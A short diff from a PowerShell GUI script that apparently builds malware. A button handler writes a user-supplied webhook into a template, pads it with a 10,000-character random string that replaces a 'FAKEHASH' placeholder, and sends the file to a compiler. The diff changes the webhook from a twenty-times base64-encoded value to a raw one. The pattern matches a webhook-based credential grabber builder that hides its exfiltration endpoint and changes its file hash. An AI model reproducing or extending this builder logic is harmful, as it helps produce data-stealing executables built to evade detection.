@@ -92,7 +92,7 @@ $button.Add_Click({
         $randomString = Get-RandomString -length 10000
         $webhookencode = Encode-Base64TwentyTimes -inputString $webhook
         $content = $content -replace 'FAKEHASH', $randomString
-        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhookencode
+        $content = $content -replace 'YOUR_WEBHOOK_HERE2', $webhook
         Set-Content -Path $filePath -Value $content
 
         # Path to the complie.exe executable
